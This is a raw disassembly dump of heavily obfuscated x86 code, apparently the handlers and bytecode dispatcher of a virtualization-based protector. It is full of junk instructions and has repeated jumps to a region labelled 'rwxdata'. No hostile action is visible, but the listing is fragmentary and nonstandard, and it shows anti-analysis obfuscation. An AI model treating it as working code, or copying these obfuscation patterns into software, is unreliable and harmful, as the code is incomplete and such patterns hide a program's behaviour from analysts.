lea esp [ esp + 0x30 ]
jmp rwxdata
mov eax [ ebp ]
sar dl 0x2
inc dl
mov edx [ ebp + 0x4 ]
clc
bt cx bx
pushfd
add ebp 0x8
mov [ esp ] ah
push esi
mov [ es : eax ] edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x86
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_51893f
pushfd
pop [ esp + 0x28 ]
lea esp [ esp + 0x28 ]
js rwxdata
pushad
call sub_51811a
inc ax
call sub_51a51c
pushfd
mov [ esp ] di
xchg [ esp + 0x34 ] esi
bswap si
mov [ esp + 0x30 ] eax
bswap si
mov si [ esp ]
call sub_519d3f
mov [ ebp ] ax
pushfd
pushfd
lea esp [ esp + 0x38 ]
jmp rwxdata
pushfd
pushfd
push [ esp + 0x8 ]
pop [ ebp ]
mov [ esp ] di
lea esp [ esp + 0xc ]
jmp sub_518895
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_5189ab
pushfd
pop [ esp + 0x20 ]
jmp rwxdata
not si
pop esi
bswap si
mov [ esp + 0x18 ] edi
pushfd
mov [ esp + 0x18 ] 0x0
bswap esi
mov esi [ esp + 0x44 ]
mov [ esp + 0x10 ] 0x28
push [ esp ]
pushfd
push [ esp ]
lea esp [ esp + 0x24 ]
jmp sub_518e7a
sub_5189b5
mov [ ebp ] ax
push ecx
lea esp [ esp + 0x10 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_5189e7
mov [ esp ] 0x8611a6e7
pushad
mov [ esp + 0x24 ] ebp
mov [ esp ] 0x11d
pushad
mov [ esp + 0x40 ] ecx
pushfd
pushfd
push [ esp + 0xc ]
mov [ esp + 0x48 ] edi
push 0x5c581f2f
mov [ esp + 0x48 ] edx
jmp rwxdata
pushfd
jmp rwxdata
jmp rwxdata
xchg [ esp + 0x48 ] esi
call sub_519089
sub_518a16
movzx si dl
call sub_519b69
mov al [ esi ]
clc
add al bl
mov [ esp ] di
pushad
inc esi
pushfd
xor al 0x29
pushfd
ror al 0x7
cmp esp 0xbfa3cd89
clc
not al
call sub_518ad1
mov [ edi + eax ] dl
push 0xef3c0ecf
inc esi
push 0xf836eada
mov [ esp ] 0x34264ef2
push ebp
lea esp [ esp + 0x10 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_518aa4
mov [ esp + 0x4 ] edi
pushfd
pushfd
pushfd
mov [ esp + 0xc ] edx
jmp rwxdata
mov [ esp + 0x8 ] esi
movsx si bl
mov [ esp + 0x4 ] eax
call sub_518a16
mov [ esp ] 0x4377c8dc
mov [ ebp + 0x4 ] ax
call j_sub_51893f
sub_518ad1
cmp dh 0xfa
clc
sub al 0xbb
push 0x6a346b2a
jmp rwxdata
add bl al
jmp rwxdata
mov al [ edi + eax ]
mov [ esp + 0x4 ] 0xc2db
sub ebp 0x2
mov [ esp + 0x14 ] ch
push 0x4b4cd6d
push 0xd95a9dbe
mov [ ebp ] ax
push [ esp + 0x8 ]
push ebp
pushfd
pushfd
lea esp [ esp + 0x4c ]
jmp sub_518895
sub_518ae1
sub ebp 0x4
call sub_519a84
movsx eax bl
mov eax [ ebp ]
dec cl
shl cl 0x5
not cl
dec cl
mov cl [ ebp + 0x4 ]
call j_sub_51a10b
mov [ ebp + 0x4 ] eax
pushfd
mov [ esp + 0x4 ] si
push 0xc843ff3f
pushfd
pop [ esp + 0x10 ]
mov [ esp ] eax
pushad
mov [ esp ] cl
mov [ esp + 0x4 ] 0xa0
push [ esp + 0x30 ]
pop [ ebp ]
mov [ esp ] 0xaab1d6dd
pushfd
push [ esp + 0x4 ]
lea esp [ esp + 0x3c ]
jmp sub_518895
sub_518b7a
pushfd
push esp
pushfd
pop [ esp + 0xc ]
pushad
push edi
push [ esp + 0x10 ]
jmp rwxdata
push [ esp + 0x34 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x3c ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_518ba1
pushad
push 0x6c15407
mov [ esp + 0x14 ] 0x3d
dec ecx
call sub_518371
push [ esp ]
mov [ esp ] 0xa1
pushad
mov [ esp + 0x24 ] edx
push ebx
mov [ esp + 0xc ] dh
jmp rwxdata
mov [ esp + 0x24 ] esi
jmp rwxdata
pushfd
movzx si bl
mov [ esp + 0x24 ] eax
push [ esp ]
bswap si
jmp rwxdata
not si
mov [ esp + 0x24 ] ebx
pushad
pop esi
movzx si cl
pushfd
pop [ esp + 0x3c ]
bswap si
push 0x1c6dc0b1
mov si [ esp + 0x4 ]
pushfd
mov [ esp + 0x40 ] edi
bswap si
call sub_518a8e
call sub_518867
xor al bh
aaa
mov eax ebp
cmp bh cl
call sub_518b6b
pop esi
mov [ esp + 0x40 ] 0x0
movsx si dl
movsx si al
push [ esp ]
mov esi [ esp + 0x70 ]
pushfd
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x48 ]
jmp sub_518e7a
sub_518c75
pushfd
lea esp [ esp + 0x44 ]
jpo rwxdata
call sub_518082
pushad
mov [ esp + 0x1c ] edi
mov [ esp ] ch
pushfd
call sub_518219
lahf
clc
shr cl 0x6
das
mov eax [ ebp ]
jl rwxdata
bts edx 0x14
shl cl 0x7
dec dl
mov edx [ ebp + 0x4 ]
call sub_519092
mov edx [ ebp + 0x4 ]
test ah ah
sub cl 0xd3
shl cl cl
push 0x661ad3a7
mov cl [ ebp + 0x8 ]
bt bx 0x8
test al 0x95
jmp rwxdata
add ebp 0x2
sub esp 0xfffffffc
jge rwxdata
cmp sp 0x71d2
bt esi ecx
jne rwxdata
bt ebp 0x18
pushad
test al 0x6c
shrd eax edx cl
call sub_51a1f6
not si
pop esi
bswap si
mov [ esp + 0x18 ] edi
pushfd
mov [ esp + 0x18 ] 0x0
bswap esi
mov esi [ esp + 0x44 ]
mov [ esp + 0x10 ] 0x28
push [ esp ]
pushfd
push [ esp ]
lea esp [ esp + 0x24 ]
jmp sub_518e7a
test bh 0xe5
cmc
cmp bp sp
jmp rwxdata
clc
shrd eax edx cl
jmp rwxdata
shrd eax edx cl
pushfd
mov [ ebp + 0x4 ] eax
call sub_51931e
pushfd
jmp rwxdata
mov [ ebp + 0x4 ] eax
call j_sub_518b7a
sub_518dc4
lea esi [ esi + 0x1875b107 ]
pushfd
pushfd
pop [ esp + 0x4c ]
not esi
lea esi [ esi * 2 - 0x7f2378ca ]
movsx esi bl
bswap esi
mov [ esp + 0x48 ] edi
jmp rwxdata
pop esi
mov [ esp + 0x40 ] 0x0
movsx si dl
movsx si al
push [ esp ]
mov esi [ esp + 0x70 ]
pushfd
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x48 ]
jmp sub_518e7a
sub_518e17
mov [ esp + 0x20 ] ebx
call sub_5189ab
mov bp sp
lea ecx [ eax - 0x70afdac7 ]
mov [ esp + 0x38 ] esi
mov si [ esp ]
xchg bp si
mov [ esp + 0x34 ] eax
mov [ esp + 0x4 ] bx
lea esi [ esi * 4 + 0x7fa7f22b ]
mov [ esp + 0x30 ] ebx
pop ebx
movzx esi bl
bswap si
pushfd
pop [ esp + 0x28 ]
inc bh
mov [ esp + 0x24 ] edi
movsx si cl
not edi
dec bp
not bp
mov [ esp + 0x20 ] 0x0
bsr cx ax
mov esi [ esp + 0x4c ]
lea esp [ esp + 0x20 ]
sub_518e7a
bsf bp di
dec al
bsf di bp
inc esi
pushad
xchg di bp
ror esi 0x1a
sar bh 0x7
sbb bl 0x86
stc
rol edi cl
sub esi 0xa76fd9fd
shr bp 0xb
not esi
mov ebp edi
btc bp 0x2
add esi 0x8e5b7f0
rcl bp cl
lea ebp [ esp + 0x20 ]
shl bh cl
add bh 0x63
sub esp 0xa0
cmp dh bl
bts edi 0x1d
mov edi esp
pushad
setae al
mov ebx esi
shld cx ax cl
pushfd
pushad
or ch 0x2b
add esi [ ebp ]
lea esp [ esp + 0x44 ]
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_518ef7
pushfd
push [ esp ]
mov [ esp ] 0x86
mov [ esp + 0x4 ] ebp
push 0x3618f84a
mov [ esp + 0x4 ] ecx
call sub_51869b
pushfd
push 0xf52f632e
mov [ esp + 0x4c ] ecx
push [ esp ]
mov [ esp + 0x4 ] 0x5e
push [ esp + 0x50 ]
retn 0x54
sub_518f47
pop esi
mov [ esp + 0x3c ] eax
mov si [ esp ]
mov [ esp + 0x38 ] ebx
pushfd
call sub_519ff1
das
add dx 0x6bcd
movsx ax cl
mov ax [ ebp ]
setpo dh
bsr dx di
stc
shrd dx di cl
mov dx [ ebp + 0x2 ]
pushad
not al
bt ax 0x6
cmp dl bl
not dl
jmp rwxdata
cmp bp 0x574c
cmp esp ebx
sub ebp 0x2
test esp 0x6dc5d6a7
lea esp [ esp + 0x20 ]
jpe rwxdata
cmp bl bh
pushad
and al dl
pushad
jmp rwxdata
clc
and al dl
push ecx
mov [ ebp + 0x4 ] ax
push ebp
pushfd
pop [ esp + 0x4 ]
pushfd
pushad
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
push 0x894d7be4
push ecx
lea esp [ esp + 0x38 ]
jmp sub_518895
pushfd
pushfd
mov [ ebp + 0x4 ] ax
lea esp [ esp + 0x48 ]
jg rwxdata
push ebx
pushfd
pushad
pushfd
pop [ esp + 0x24 ]
push esi
jmp rwxdata
pushad
pushad
mov [ esp + 0x8 ] 0xc4
pushfd
pop [ esp + 0x3c ]
mov [ esp + 0xc ] 0xdce8
push [ esp + 0x4 ]
pushfd
mov [ esp ] ah
push [ esp + 0x44 ]
pop [ ebp ]
push 0x616bdfc3
push [ esp + 0x8 ]
mov [ esp ] bx
mov [ esp + 0x10 ] 0x9b
lea esp [ esp + 0x50 ]
jmp sub_518895
jmp rwxdata
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_518f8f
pushad
push 0xc8ea506a
mov [ esp + 0x30 ] ecx
push 0x447b02b
jmp rwxdata
mov [ esp ] esp
mov [ esp + 0x30 ] edi
pushfd
push 0x2ba3abe7
pushfd
pushfd
mov [ esp + 0x3c ] edx
jmp rwxdata
push ecx
push 0xe96143e3
xchg [ esp + 0x40 ] esi
pushfd
jmp sub_518f47
sub_51904d
neg al
pushfd
jmp rwxdata
pushfd
inc esi
pushfd
test al dh
cmc
add bl al
jmp rwxdata
mov ax [ edi + eax ]
cmc
sub ebp 0x2
mov [ esp ] bh
push edx
mov [ ebp ] ax
pushfd
pushfd
mov [ esp ] si
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_519092
pushad
adc cl bh
mov cl [ ebp + 0x8 ]
stc
push 0xbfbaf315
add ebp 0x2
jmp rwxdata
call sub_51a279
stc
bsf bp bx
pop ebp
pushfd
push [ esp + 0x4 ]
popfd
lea ebx [ ebx * 2 - 0x7df4df69 ]
mov ebx [ esp + 0x8 ]
setge al
mov eax [ esp + 0xc ]
lea edx [ ebx - 0x75ee937a ]
mov esi [ esp + 0x10 ]
mov cl [ esp + 0x10 ]
movzx edx dl
mov edx [ esp + 0x14 ]
push edi
setno ch
movsx bp cl
push ebp
mov edi [ esp + 0x20 ]
not bp
call sub_5186f3
sub_5190c9
mov [ esp ] ah
inc esi
push ebx
mov [ esp ] ah
mov [ esp ] 0x15
jmp rwxdata
inc al
pushfd
pushfd
bt dx bx
add bl al
cmc
test dx 0x78c6
sub ebp 0x2
pushfd
mov [ esp ] bx
call sub_5185dd
push esp
call sub_518b8c
cmp ah 0x7
mov eax [ ebp ]
sar cl cl
jmp sub_518a78
sub_5190f2
jmp rwxdata
inc ax
call sub_51a51c
pushfd
mov [ esp ] di
xchg [ esp + 0x34 ] esi
bswap si
mov [ esp + 0x30 ] eax
bswap si
mov si [ esp ]
call sub_519d3f
mov [ ebp ] ax
pushfd
pushfd
lea esp [ esp + 0x38 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_5191a9
pushad
mov [ esp + 0x1c ] ebp
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xe5be
push [ esp + 0x4 ]
pushad
mov [ esp + 0x3c ] ecx
call sub_518c75
test di 0xe144
sub ebp 0x2
cmp dh 0xd
push 0xfd71cebf
shr ax cl
lea esp [ esp + 0x4 ]
jno rwxdata
push 0xa891e339
mov [ esp ] 0x71
mov [ ebp + 0x4 ] ax
pushad
jmp rwxdata
mov [ ebp + 0x4 ] ax
jmp sub_518f89
push [ esp ]
pushfd
pop [ esp + 0x24 ]
pushad
push [ esp + 0x44 ]
pop [ ebp ]
mov [ esp + 0x8 ] dx
mov [ esp ] al
push eax
push [ esp ]
lea esp [ esp + 0x50 ]
jmp sub_518895
sub_51922f
pushfd
mov [ esp + 0x4 ] edi
jmp rwxdata
push [ esp ]
mov [ esp ] 0xa1
pushad
mov [ esp + 0x24 ] edx
push ebx
mov [ esp + 0xc ] dh
jmp rwxdata
mov [ esp + 0x24 ] esi
jmp rwxdata
pushfd
movzx si bl
mov [ esp + 0x24 ] eax
push [ esp ]
bswap si
jmp rwxdata
not si
mov [ esp + 0x24 ] ebx
pushad
pop esi
movzx si cl
pushfd
pop [ esp + 0x3c ]
bswap si
push 0x1c6dc0b1
mov si [ esp + 0x4 ]
pushfd
mov [ esp + 0x40 ] edi
bswap si
call sub_518a8e
call sub_518867
xor al bh
aaa
mov eax ebp
cmp bh cl
call sub_518b6b
pop esi
mov [ esp + 0x40 ] 0x0
movsx si dl
movsx si al
push [ esp ]
mov esi [ esp + 0x70 ]
pushfd
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x48 ]
jmp sub_518e7a
sub_5192db
mov [ esp + 0x1c ] edi
movzx esi dl
pushfd
pushad
mov [ esp + 0x3c ] 0x0
pop esi
mov [ esp + 0x8 ] 0x733
bswap si
call sub_519c3b
push ecx
push 0xe96143e3
xchg [ esp + 0x40 ] esi
pushfd
jmp sub_518f47
sub_51931e
mov [ esp ] bl
pushfd
pop [ esp + 0x4 ]
pushad
pushad
push [ esp ]
jmp rwxdata
push [ esp + 0x48 ]
pop [ ebp ]
mov [ esp + 0x4 ] 0xcaa40f15
mov [ esp ] esi
push ebp
mov [ esp + 0x4 ] dl
lea esp [ esp + 0x50 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_519341
pushfd
not si
pushfd
pop [ esp + 0x38 ]
pushfd
mov [ esp + 0x38 ] edi
lea esi [ esi * 4 + 0xb2e93b4 ]
call sub_519c95
push [ esp + 0x34 ]
pop [ ebp ]
pushfd
pushfd
lea esp [ esp + 0x40 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_5193e2
pushfd
lea esi [ 0xffffffffb34db521 ]
mov [ esp + 0x2c ] ebx
lea esp [ esp + 0x2c ]
ja rwxdata
mov si 0x9371
mov si 0x8152
bswap si
not si
pushfd
push 0x753c815
mov [ esp ] edi
not si
not si
bswap esi
mov esi 0x360d7564
push 0x0
jmp rwxdata
pushad
pushfd
pop [ esp + 0x1c ]
movsx si dl
lea esi [ esi - 0x6f8af4a5 ]
call sub_5192db
inc eax
mov [ esp + 0x8 ] bh
stc
pushfd
ror eax 0xe
lea esp [ esp + 0x30 ]
jb rwxdata
push ecx
not esi
movzx si cl
mov esi [ esp + 0x30 ]
push ebp
lea esp [ esp + 0x8 ]
jmp sub_518e7a
push 0x82e0054f
push esp
call sub_518b3b
mov edx [ ebp ]
rol al 0x6
shl al 0x7
shl al 0x3
add ebp 0x2
jmp rwxdata
pushfd
pushad
inc eax
push [ esp + 0x4 ]
push 0x3ed30535
rol eax 0x9
pushfd
bt di cx
bt bx 0x8
push esp
sub esi 0xfffffffc
stc
test cl dh
jmp sub_518bd5
call j_sub_5194cb
seto ah
and ax ax
cbw
rcl al 0x7
mov ax [ esi ]
call sub_518502
sub_519456
jmp rwxdata
mov [ ebp + 0x4 ] eax
pushfd
mov [ esp + 0x4 ] si
push 0xc843ff3f
pushfd
pop [ esp + 0x10 ]
mov [ esp ] eax
pushad
mov [ esp ] cl
mov [ esp + 0x4 ] 0xa0
push [ esp + 0x30 ]
pop [ ebp ]
mov [ esp ] 0xaab1d6dd
pushfd
push [ esp + 0x4 ]
lea esp [ esp + 0x3c ]
jmp sub_518895
sub_5194cb
pushfd
mov al [ ss : edx ]
push 0x6d25cbf9
mov [ ebp ] ax
pushfd
pushfd
mov [ esp ] 0x12
push 0x60d685a1
lea esp [ esp + 0x18 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_519592
stc
call sub_518340
pushfd
pushfd
mov [ esp ] si
dec ecx
jmp rwxdata
add ecx 0x0
push 0xb00ad8e
call sub_518574
pushfd
mov [ ebp + 0x4 ] ax
call sub_51a508
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_519643
mov [ esp ] eax
pushfd
mov [ esp + 0x4 ] 0x30
lea esp [ esp + 0x4c ]
jne rwxdata
bts cx sp
not cl
clc
movzx ecx [ edx ]
bt bx di
shl eax 0x4
push 0x640c253d
clc
cmp edi 0x6fc73fa
add eax ecx
call sub_51842c
add ah 0x37
btr ax 0xf
adc edx 0x86dbf1c8
mov eax [ ebp ]
shld dx di 0xc
stc
shr dl 0x2
or dx 0xf928
mov edx [ ebp + 0x4 ]
test cl al
stc
add ebp 0x8
jmp rwxdata
jmp rwxdata
mov [ ss : eax ] edx
push ebx
push [ esp ]
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
jl rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
jmp rwxdata
mov [ ebp ] eax
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
mov [ ebp ] eax
push ecx
pushad
push [ esp ]
lea esp [ esp + 0x28 ]
jmp rwxdata
sub_519ac6
movsx dx cl
sub edx 0x95545e54
inc dh
sub al 0x9b
xor dl 0x33
movsx dx dl
neg al
bsr dx cx
sub al 0x4a
dec dh
neg al
setpo dh
movsx dx cl
ror al 0x6
test bx 0xb465
xor al 0xb0
rol edx cl
bswap dx
movsx dx cl
push ebp
and al 0x3c
bsr dx cx
xor dx 0xd3f0
movzx edx bl
stc
mov edx [ ebp ]
cmp si di
push ecx
call sub_51a262
sub_519b69
pop esi
mov [ esp + 0x4 ] ebx
not si
lea esi [ ecx * 2 - 0x1131e5ec ]
pushfd
pushad
pushfd
pop [ esp + 0x24 ]
pushfd
lea esi [ esp - 0x1a2720be ]
movsx si cl
movzx esi bl
mov [ esp + 0x24 ] edi
not si
call sub_518520
push ebx
mov [ esp ] 0x9a91
pushfd
push [ esp + 0x4 ]
mov [ esp + 0x8 ] ebp
call sub_519c32
sub_519be0
mov [ esp + 0xc ] 0x1929
sub esi 0xfffffffc
mov [ esp + 0x8 ] 0x56
xor eax 0xc0503a94
cmc
test ah 0x34
add ebx eax
call sub_518791
mov [ ebp ] eax
push ecx
pushad
push [ esp ]
lea esp [ esp + 0x28 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_519cf1
mov [ esp + 0x4 ] eax
movzx si cl
not si
mov [ esp ] ebx
pushfd
pushad
pushfd
pop [ esp + 0x20 ]
mov si [ esp ]
mov [ esp + 0x1c ] edi
lea esi [ ebp * 2 - 0x7cd756e2 ]
pop esi
bswap si
mov [ esp + 0x14 ] 0x0
call sub_5190ab
sub_519d3f
lea esi [ ebp + 0x72adc9a3 ]
mov [ esp + 0x30 ] ebx
lea esi [ ebp * 4 + 0x4d3d7a4a ]
not si
movzx si al
pop esi
pushfd
pop [ esp + 0x28 ]
jmp rwxdata
call sub_518867
xor al bh
aaa
mov eax ebp
cmp bh cl
call sub_518b6b
pop esi
mov [ esp + 0x40 ] 0x0
movsx si dl
movsx si al
push [ esp ]
mov esi [ esp + 0x70 ]
pushfd
mov [ esp + 0x4 ] bx
lea esp [ esp + 0x48 ]
jmp sub_518e7a
sub_519d95
pushfd
pushfd
bswap ecx
jmp rwxdata
mov [ esp ] bl
pushfd
dec ecx
cmp edx edi
xor ecx 0x5acd9c40
call sub_518ba1
btr ax si
das
mov ax [ ebp ]
or cl 0x23
mov cl [ ebp + 0x2 ]
stc
pushad
pushfd
jmp rwxdata
sub ebp 0x2
cmp bl ah
cmp bh 0x42
shl ax cl
pushad
push esp
pushfd
push edi
mov [ ebp + 0x4 ] ax
jmp rwxdata
call j_sub_51a09d
sub_519dcf
push edx
pushfd
push 0xb9d31a01
call sub_51a285
add ecx 0x0
push 0xb00ad8e
call sub_518574
pushfd
mov [ ebp + 0x4 ] ax
call sub_51a508
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_519e06
pushfd
pushfd
pop [ esp + 0x4 ]
bswap di
not di
mov edi ebp
movsx edi al
mov [ esp ] esi
pushfd
mov esi edx
pushad
mov [ esp + 0x8 ] 0x2026
lea edi [ eax + ecx - 0x40 ]
mov [ esp + 0xc ] 0xea
mov [ esp + 0x10 ] 0x5c
jmp rwxdata
xchg [ esp + 0x20 ] edi
lea edi [ edi * 4 - 0x49210cb6 ]
movsx edi dl
mov [ esp ] bx
push ebp
mov edi eax
pushfd
lea esp [ esp + 0x28 ]
jb rwxdata
cld
pushfd
std
mov [ esp ] 0x65c8
cld
push 0x7898e020
mov [ esp ] 0x5d
[ edi ] [ esi ]
bt ebp edx
pushad
mov edi [ esp + 0x28 ]
shld si cx cl
cmc
mov esi [ esp + 0x2c ]
cmc
call sub_519f85
std
cld
call sub_51a4a2
sub_519f55
dec ecx
cmp ax di
mov [ esp + 0x8 ] ch
jmp rwxdata
mov [ esp ] dl
xor ecx 0x5acd9c40
lea esp [ esp + 0x28 ]
js rwxdata
pushfd
pushfd
mov [ esp ] si
dec ecx
jmp rwxdata
pushad
dec ecx
stc
clc
call sub_519b1e
inc al
clc
cmp edi 0xe9fe9472
call sub_51904d
dec al
pushad
bt sp sp
pushfd
rol al 0x2
push [ esp ]
inc al
push esi
stc
stc
mov [ esp + 0x4 ] dl
add bl al
pushfd
call sub_518309
push [ esp ]
mov al [ edx ]
call sub_5189b5
bt bx 0x8
add ebp 0x2
bt bx bx
shld eax edx cl
pushfd
mov [ esp ] cl
mov [ ebp + 0x4 ] eax
mov [ esp ] al
jmp rwxdata
add ecx 0x0
push 0xb00ad8e
call sub_518574
pushfd
mov [ ebp + 0x4 ] ax
call sub_51a508
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
pushfd
pop [ esp ]
pushfd
mov [ esp ] cx
pushfd
call sub_5181a3
sub_519f85
pushfd
push [ esp + 0x38 ]
popfd
mov [ esp ] bx
push [ esp + 0xc ]
lea esp [ esp + 0x40 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a074
pushfd
pushad
mov [ esp + 0x24 ] edx
lea esp [ esp + 0x24 ]
jge rwxdata
pushfd
pushad
mov [ esp + 0x20 ] esi
pop esi
mov [ esp + 0x18 ] eax
pushfd
call sub_51919e
push eax
mov [ esp ] bh
push ecx
mov [ esp + 0x4 ] esi
jmp rwxdata
call sub_519cf1
push ebp
mov [ esp + 0x4 ] bh
push ecx
mov [ esp + 0x28 ] edi
jmp rwxdata
jmp rwxdata
mov [ esp + 0x24 ] edx
push [ esp + 0x14 ]
call sub_519d26
sub_51a115
mov [ esp ] ebx
lea esi [ ebp + 0x33ef660c ]
not si
pushfd
lea esi [ ecx - 0x53fddcb2 ]
not si
lea esi [ ebp * 4 + 0x744b5660 ]
pushad
mov [ esp + 0x1c ] edi
not si
mov [ esp + 0x18 ] 0x0
movzx si bl
mov esi [ esp + 0x44 ]
push [ esp ]
mov [ esp ] 0xa4
lea esp [ esp + 0x1c ]
jmp sub_518e7a
sub_51a1f6
mov [ ebp + 0x4 ] eax
push edi
pushfd
mov [ esp + 0x18 ] 0x18
pushfd
pop [ esp + 0x28 ]
push [ esp + 0x4 ]
push [ esp + 0x2c ]
pop [ ebp ]
push [ esp + 0x8 ]
lea esp [ esp + 0x34 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a262
add ebp 0x4
mov [ esp ] di
mov [ edi + eax ] edx
mov [ esp + 0xc ] dl
lea esp [ esp + 0x10 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a285
mov [ esp + 0xc ] ebp
call j_sub_518f8f
lea esp [ esp + 0x8 ]
ja rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
btc dx di
xadd dl ah
bts cx si
rol ch cl
mov edx esp
and ch dl
bsr cx si
lea ecx [ edi + 0x40 ]
rol edi cl
shr di 0x7
sub ecx edx
aad 0xbb
xor di dx
not di
shld di bp cl
lea eax [ ebp - 0x80 ]
bsf di bp
and al 0xfc
rol di 0x3
shld edi esp 0xf
sub eax ecx
call sub_51892f
btr eax edi
stc
bt dx si
mov eax [ esi ]
pushfd
test ah al
pushad
add eax ebx
push 0x325a0f62
call sub_518862
shl ah 0x7
jpo rwxdata
xadd edx eax
bts dx 0x4
dec dx
aam 0x4b
mov eax [ ebp ]
btr edx 0xe
mov edx [ ebp + 0x4 ]
cmc
test bh dh
add ebp 0x8
pushad
mov [ esp + 0x4 ] dx
push eax
pushfd
mov [ es : eax ] edx
pushfd
pushfd
lea esp [ esp + 0x30 ]
jmp rwxdata
mov eax [ ebp ]
sar dl 0x2
inc dl
mov edx [ ebp + 0x4 ]
clc
bt cx bx
pushfd
add ebp 0x8
mov [ esp ] ah
push esi
mov [ es : eax ] edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x86
lea esp [ esp + 0x8 ]
jmp rwxdata
sub_51a356
pushad
pushad
pushfd
pop [ esp + 0x3c ]
push [ esp ]
push 0x7c16dd95
jmp rwxdata
push [ esp + 0x44 ]
pop [ ebp ]
mov [ esp + 0x4 ] 0x4a
push [ esp ]
mov [ esp ] al
mov [ esp + 0xc ] edi
lea esp [ esp + 0x4c ]
jmp sub_518895
sub_51a431
cmc
shl eax cl
pushfd
push [ esp ]
mov [ esp ] bl
push [ esp + 0x4 ]
mov [ ebp + 0x4 ] eax
pushad
push [ esp + 0xc ]
call sub_51868d
bt bp bx
cmp al 0x61
sub ebp 0x2
pushfd
cmc
cmp edx 0xa499fe00
shr al cl
lea esp [ esp + 0xc ]
jg rwxdata
jmp rwxdata
push 0x1f1c61ef
mov [ esp ] 0xe6
mov [ ebp + 0x4 ] ax
pushad
pushad
lea esp [ esp + 0x44 ]
jpo rwxdata
pushfd
mov [ ebp + 0x4 ] ax
call sub_51a508
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518895
jmp sub_51a356
pushfd
pushfd
pop [ esp ]
call sub_518b65
sub_51a4a2
pushad
mov [ esp + 0xc ] dl
[ edi ] [ esi ]
inc di
shl si cl
shr di 0x5
and si 0x2c78
mov edi [ esp + 0x24 ]
rcr si 0xf
xor si sp
mov [ esp + 0xc ] ax
stc
mov esi [ esp + 0x28 ]
pushfd
push [ esp + 0x30 ]
popfd
pushfd
pushfd
lea esp [ esp + 0x3c ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a4de
mov [ esp + 0x1c ] ebx
bswap si
movsx esi dl
pushad
pushfd
pop [ esp + 0x38 ]
mov [ esp + 0x10 ] bp
jmp rwxdata
bswap esi
mov [ esp + 0x34 ] edi
pushfd
mov [ esp + 0x34 ] 0x0
jmp rwxdata
push 0xff3c0903
push eax
movzx si bl
mov esi [ esp + 0x68 ]
mov [ esp + 0x8 ] 0x87c6
lea esp [ esp + 0x3c ]
jmp sub_518e7a
sub_51a51c
cmc
neg ax
bt cx 0x3
ror ax 0x3
call sub_519592
mov [ ebp ] eax
pushad
mov [ esp + 0x4 ] bl
push 0xf259ffc4
mov [ esp ] dh
lea esp [ esp + 0x2c ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a591
jmp rwxdata
pushfd
mov [ esp ] di
xchg [ esp + 0x34 ] esi
bswap si
mov [ esp + 0x30 ] eax
bswap si
mov si [ esp ]
call sub_519d3f
mov [ ebp ] ax
pushfd
pushfd
lea esp [ esp + 0x38 ]
jmp rwxdata
